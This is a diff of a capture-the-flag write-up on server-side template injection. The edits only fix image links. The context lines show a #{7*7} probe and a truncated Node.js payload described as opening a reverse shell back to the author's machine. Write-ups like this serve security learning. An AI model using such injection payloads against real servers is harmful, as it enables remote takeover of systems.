@@ -11,11 +11,11 @@ from the above image we can do SSTI with #{injection}, for the first payload i w
 #{7\*7}
 ```
 
-![[../Images/Template-Image-2.png]]
+![](Images/Template-Image-2.png)
 
 then click convert will return this
 
-![[../Images/Template-Image-3.png]]
+![](Images/Template-Image-3.png)
 
 after that we can further attack with different payload that can help up find the flag. In this case, i will try to make reverse shell that will connect to my computer with this payload
 ```Js
@@ -23,7 +23,7 @@ h1 #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLo
 ```
 that payload will make connection back to our computer we thay render the code
 
-![[../Images/Template-Image-4.png]]
+![](Images/Template-Image-4.png)
 
 <H4>Link that can Help</H4>
 [SSTI Cheat Sheet](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
